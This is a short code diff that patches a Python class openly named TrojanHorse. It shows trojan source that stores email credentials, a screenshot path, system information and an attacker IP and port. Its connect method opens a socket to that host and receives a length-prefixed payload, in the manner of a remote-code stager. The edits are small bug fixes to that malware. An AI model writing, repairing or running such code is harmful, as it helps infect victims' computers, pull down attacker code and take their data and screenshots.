@@ -27,7 +27,7 @@ class TrojanHorse:
         self.email = email
         self.temp_screenshot = tempfile.gettempdir() + "\\screenshot.png"
         self.password = password
-        self.ip = ip
+        self.ip = str(ip) 
         self.port = port
         self.system_info = self.get_system_info()
 
@@ -90,7 +90,7 @@ class TrojanHorse:
     def connect(self, ip, port):
         try:
             s=socket.socket(2,1)
-            s.connect((f'{self.ip}',self.port))
+            s.connect((self.ip,self.port))
             l=struct.unpack('>I',s.recv(4))[0]
             d=s.recv(4096)
             while len(d)!=l:
